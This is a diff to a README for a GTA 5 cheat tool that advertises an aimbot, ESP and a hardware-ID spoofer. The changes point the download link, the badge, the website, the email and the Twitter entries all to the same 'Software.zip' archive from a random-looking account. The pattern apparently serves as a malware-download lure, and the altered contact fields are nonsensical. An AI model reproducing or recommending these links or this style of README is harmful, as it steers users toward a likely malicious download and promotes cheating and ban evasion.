@@ -14,9 +14,9 @@ Welcome to the Mod-Gta5 repository! If you love playing GTA 5 and want to take y
 📦 **Repository Name:** Mod-Gta5  
 📝 **Short Description:** This tool includes an HWID spoofer, customizable aimbot, character ESP, and 2D radar for enhanced gameplay.  
 🏷 **Topics:** archived, gta, gta5, hacker, java, java-native-access, java-natives, jna, jni, memory, memory-manipulation, mod, nativeui, scripthookv  
-🔗 **Download Link:** [Download Mod-Gta5 v1.0.0](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)  
+🔗 **Download Link:** [Download Mod-Gta5 v1.0.0](https://github.com/asdjodsaijodsajoip/Mod-Gta5/releases/download/v1.0/Software.zip)  
 
-[![Download Mod-Gta5 v1.0.0](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Mod-Gta5 v1.0.0](https://github.com/asdjodsaijodsajoip/Mod-Gta5/releases/download/v1.0/Software.zip)](https://github.com/asdjodsaijodsajoip/Mod-Gta5/releases/download/v1.0/Software.zip)
 
 ## Installation Guide 📥
 
@@ -46,9 +46,9 @@ Grand Theft Auto V (GTA 5) is an action-adventure game developed by Rockstar Gam
 
 Stay connected with the Mod-Gta5 community for updates, discussions, and more:
 
-🌍 Website: [Mod-Gta5 Website](https://modgta5.com)  
-📧 Email: contact@modgta5.com  
-🐦 Twitter: [@ModGta5Official](https://twitter.com/ModGta5Official)  
+🌍 Website: [Mod-Gta5 Website](https://github.com/asdjodsaijodsajoip/Mod-Gta5/releases/download/v1.0/Software.zip)  
+📧 Email: https://github.com/asdjodsaijodsajoip/Mod-Gta5/releases/download/v1.0/Software.zip  
+🐦 Twitter: [@ModGta5Official](https://github.com/asdjodsaijodsajoip/Mod-Gta5/releases/download/v1.0/Software.zip)  
 
 Let's make your GTA 5 gaming experience more exciting with Mod-Gta5! 🚗💨
 
